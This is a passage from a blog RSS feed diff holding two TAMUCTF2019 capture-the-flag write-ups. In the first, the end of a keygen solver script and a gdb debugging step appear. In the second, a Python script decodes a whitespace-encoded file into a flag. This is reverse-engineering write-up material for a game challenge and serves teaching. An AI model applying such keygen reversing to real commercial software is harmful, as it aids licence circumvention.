+				&lt;span class=&quot;n&quot;&gt;flagfinal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagfinal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cont&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+					&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagfinal&lt;/span&gt;
+		 
+	
+
+	&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://gist.githubusercontent.com/D4nPs/7c71f549298b7e64101133b45df4cdeb/raw/94d7270e776c192477b23393f54b11a6244fa9c8/test.py&quot;&gt;LINK BASE GITHUB&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;By running this script I got&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;GHZxSZcfov09&amp;lt;GNRB&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s send to the server and get our FLAG!&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code6.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Well…Maybe not 😢.&lt;/p&gt;
+
+&lt;p&gt;Let’s use gdb-PEDA to find out why we did not get our deserved flag.&lt;/p&gt;
+
+&lt;p&gt;I set up a breakpoint right before my input and that awful string are compared and I got this.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code7.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So the program adds this “\n” and I’m not sure why.&lt;/p&gt;
+
+&lt;p&gt;That thing made me wonder for a while why that’s there and how to bypass it.&lt;/p&gt;
+
+&lt;p&gt;Then I found the solution to be very simple (and a bit of luck maybe?). This “\n” is changing into “i” because it’s after a “B”, so I have to find a character that change “\n” into “K”.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code8.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And the “R” was there all along to save me.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/4/code9.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;
+
+&lt;p&gt;by me&lt;/p&gt;
+</description>
+        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/tamuctf2019-keygenme-write-up/</link>
+        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-keygenme-write-up/</guid>
+        
+        <category>CTF</category>
+        
+        <category>|</category>
+        
+        <category>RATF</category>
+        
+        <category>|</category>
+        
+        <category>FLAG</category>
+        
+        <category>|</category>
+        
+        <category>CHALLENGE</category>
+        
+        
+        <category>challenge</category>
+        
+      </item>
+    
+      <item>
+        <title>TAMUCTF2019 Hello World Write-up</title>
+        <description>&lt;p&gt;Hey guys! This post I’ll be showing you how I solved the Hello World Challenge from TAMUCTF2019.&lt;/p&gt;
+
+&lt;p&gt;This was a MISC challenge rated as medium difficulty by the CTF organizers.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/1/ratf.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/5/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I downloaded the file and used the cat command on it.&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/5/code.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It showed something like that. That made me think, what are those blank spaces?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cmd&quot; data-lang=&quot;cmd&quot;&gt;00000000: 2020 2009 0920 2009 0909 0a20 2020 0909     ..  ....   ..                                                                                                                                                                    
+00000010: 2009 2020 090a 2020 2009 0920 2009 0909   .  ..   ..  ...                                                                                                                                                                    
+00000020: 0a20 2020 0909 2020 0920 090a 2020 2009  .   ..  . ..   .                                                                                                                                                                    
+00000030: 0920 0909 2009 0a20 2020 0909 0909 2009  . .. ..   .... .                                                                                                                                                                       
+00000040: 090a 2020 2009 0920 2020 200a 2020 2009  ..   ..    .   .                                                                                                                                                                        
+00000050: 0920 0920 2020 0a20 2020 0920 0909 0909  . .   .   . .... 
+00000060: 090a 2020 2009 0920 0909 2009 0a20 2020  ..   .. .. ..    
+00000070: 0909 0909 2020 090a 2020 2009 2009 0909  ....  ..   . ... 
+00000080: 0909 0a20 2020 0909 0920 0909 090a 2020  ...   ... ....   
+00000090: 2009 0920 0920 2020 0a20 2020 0909 2009   .. .   .   .. . 
+000000a0: 2020 0a20 2020 0909 0920 0920 200a 2020    .   ... .  .   
+000000b0: 2009 2009 0909 0909 0a20 2020 0909 0920   . ......   ...  
+000000c0: 2009 090a 2020 2009 0909 2020 2020 0a20   ...   ...    .  
+000000d0: 2020 0909 2009 2020 0a20 2020 0909 2020    .. .  .   ..   
+000000e0: 2009 090a 2020 2009 0920 2020 090a 2020   ...   ..   ..   
+000000f0: 2009 0920 0909 0920 0a20 2020 0909 2020   .. ... .   ..   
+00000100: 0909 090a 2020 2009 2009 0909 0909 0a20  ....   . ......  
+00000110: 2020 0909 0909 2020 090a 2020 2009 0920    ....  ..   ..  
+00000120: 2020 200a 2020 2009 0909 2009 2009 0a20     .   ... . ..  
+00000130: 2020 0920 0909 0909 090a 2020 2009 0920    . ......   ..  
+00000140: 0920 2020 0a20 2020 0909 2009 2020 0a20  .   .   .. .  .  
+00000150: 2020 0909 0920 0909 200a 2020 2009 0920    ... .. .   ..  
+00000160: 2009 090a 2020 2009 0909 0909 2009 0a20   ...   ..... ..  
+00000170: 2020 0920 2020 2009 0a20 2020 0909 2020    .    ..   ..   
+00000180: 0920 090a 2020 2009 0920 2020 0909 0a20  . ..   ..   ...  
+00000190: 2020 0909 2020 2020 090a 2020 2009 0909    ..    ..   ... 
+000001a0: 2020 2020 0a20 2020 0909 0920 2009 090a      .   ...  ... 
+000001b0: 2020 2009 0920 2009 2009 0a20 2020 0909     ..  . ..   .. 
+000001c0: 0920 0920 200a 2020 2009 0920 0920 2009  . .  .   .. .  . 
+000001d0: 0a20 2020 0909 2009 2020 200a 2020 2009  .   .. .   .   . 
+000001e0: 0909 2009 0909 0a20 2020 0920 2020 2020  .. ....   .      
+000001f0: 0a20 2020 0909 2020 0909 200a 2020 2009  .   ..  .. .   . 
+00000200: 0920 0909 0909 0a20 2020 0920 2020 2020  . .....   .      
+00000210: 0a20 2020 0909 0920 0920 200a 2020 2009  .   ... .  .   . 
+00000220: 0920 0909 0909 0a20 2020 0909 2009 0920  . .....   .. ..  
+00000230: 200a 2020 2009 2020 2020 200a 2020 2009   .   .     .   . 
+00000240: 0920 2020 2009 0a20 2020 0920 2020 2020  .    ..   .      
+00000250: 0a20 2020 0909 0920 2009 090a 2020 2009  .   ...  ...   . 
+00000260: 0920 0920 2009 0a20 2020 0920 2020 2020  . .  ..   .      
+00000270: 0a20 2020 0909 2020 0920 090a 2020 2009  .   ..  . ..   . 
+00000280: 0909 2020 0920 0a20 2020 0909 0920 0920  ..  . .   ... .  
+00000290: 090a 2020 2009 0909 2020 0909 0a20 2020  ..   ...  ...    
+000002a0: 0920 2020 2020 0a20 2020 0909 0920 0920  .     .   ... .  
+000002b0: 200a 2020 2009 0920 2020 2009 0a20 2020   .   ..    ..    
+000002c0: 0909 2009 2020 200a 2020 2009 0909 2009  .. .   .   ... . 
+000002d0: 2020 0a20 2020 0920 2020 2020 0a20 2020    .   .     .    
+000002e0: 0920 0909 2020 0a20 2020 0909 2020 0920  . ..  .   ..  .  
+000002f0: 090a 2020 2009 0920 2009 2009 0a20 2020  ..   ..  . ..    
+00000300: 0909 2020 0909 090a 2020 2009 2020 2020  ..  ....   .     
+00000310: 200a 2020 2009 0909 0920 2009 0a20 2020   .   ....  ..    
+00000320: 0909 2009 0920 200a 2020 2009 0920 0909  .. ..  .   .. .. 
+00000330: 2020 0a20 2020 0909 2009 0909 090a 2020    .   .. .....   
+00000340: 2009 0920 2009 0909 0a20 2020 0920 2020   ..  ....   .    
+00000350: 2020 0a20 2020 0909 0920 0920 200a 2020    .   ... .  .   
+00000360: 2009 0920 2009 2009 0a20 2020 0909 2020   ..  . ..   ..   
+00000370: 0920 090a 2020 2009 0909 2009 0909 0a20  . ..   ... ....  
+00000380: 2020 0909 0920 2009 090a 2020 2009 2020    ...  ...   .   
+00000390: 2020 200a 2020 2009 0920 0909 2020 0a20     .   .. ..  .  
+000003a0: 2020 0909 2009 0920 200a 2020 2009 0920    .. ..  .   ..  
+000003b0: 2009 2009 0a20 2020 0920 0920 0909 090a   . ..   . . .... 
+000003c0: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+000003d0: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+000003e0: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+000003f0: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000400: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000410: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000420: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000430: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000440: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000450: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000460: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000470: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000480: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   
+00000490: 090a 2020 090a 2020 090a 2020 0a0a 0a23  ..  ..  ..  ...# 
+000004a0: 696e 636c 7564 6520 3c69 6f73 7472 6561  include &amp;lt;iostrea 
+000004b0: 6d3e 0a75 7369 6e67 206e 616d 6573 7061  m&amp;gt;.using namespa 
+000004c0: 6365 2073 7464 3b0a 0a69 6e74 206d 6169  ce std;..int mai 
+000004d0: 6e28 290a 7b0a 0963 6f75 7420 3c3c 2022  n().{..cout &amp;lt;&amp;lt; &quot; 
+000004e0: 4865 6c6c 6f2c 2057 6f72 6c64 7321 5c6e  Hello, Worlds!\n 
+000004f0: 223b 0a09 7265 7475 726e 2030 3b0a 7d0a  &quot;;..return 0;.}.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Using the xxd command and the hexadecimal of this file was shown.&lt;/p&gt;
+
+&lt;p&gt;Those strange ‘20’ and ‘09’ and ‘0a’ gotta mean something. After analyzing for a couple of minutes I noticed that the ‘0a’ repeats itself always after 10 spaces.&lt;/p&gt;
+
+&lt;p&gt;So I imagined this should be a binary encoded string where ‘20’ = 0 , ‘09’ = 1 and ‘0a’ = space. So I wrote a small python script to extract the flag!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;flagenc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flagenc.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rwa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;support&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;support2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagenc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;20&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;09&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;support&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;support&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;	
+&lt;span class=&quot;n&quot;&gt;support&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;support&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;flagenc2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;support&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagenc2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;flagenc3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flagenc2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;support2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;support2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flagenc3&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+]FLAG:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;support2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;a href=&quot;https://gist.githubusercontent.com/D4nPs/e206fcf9109159b823041e25452263d6/raw/7a564de46c45724270c41f1e7a4f12c4c0553a24/hello.py&quot;&gt;LINK BASE GITHUB&lt;/a&gt;&lt;/p&gt;
+
+&lt;p class=&quot;text-center&quot;&gt;&lt;img src=&quot;/img/jekyll/5/code2.png&quot; alt=&quot;ratf&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hope you guys enjoyed it!&lt;/p&gt;
+
+&lt;p&gt;by me&lt;/p&gt;
+</description>
+        <pubDate>Fri, 03 May 2019 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/tamuctf2019-hello-world-write-up/</link>
+        <guid isPermaLink="true">http://localhost:4000/tamuctf2019-hello-world-write-up/</guid>
+        
+        <category>CTF</category>
+        
+        <category>|</category>
+        
+        <category>RATF</category>
+        
+        <category>|</category>
+        
+        <category>FLAG</category>
+        
+        <category>|</category>
         
         <category>CHALLENGE</category>
         
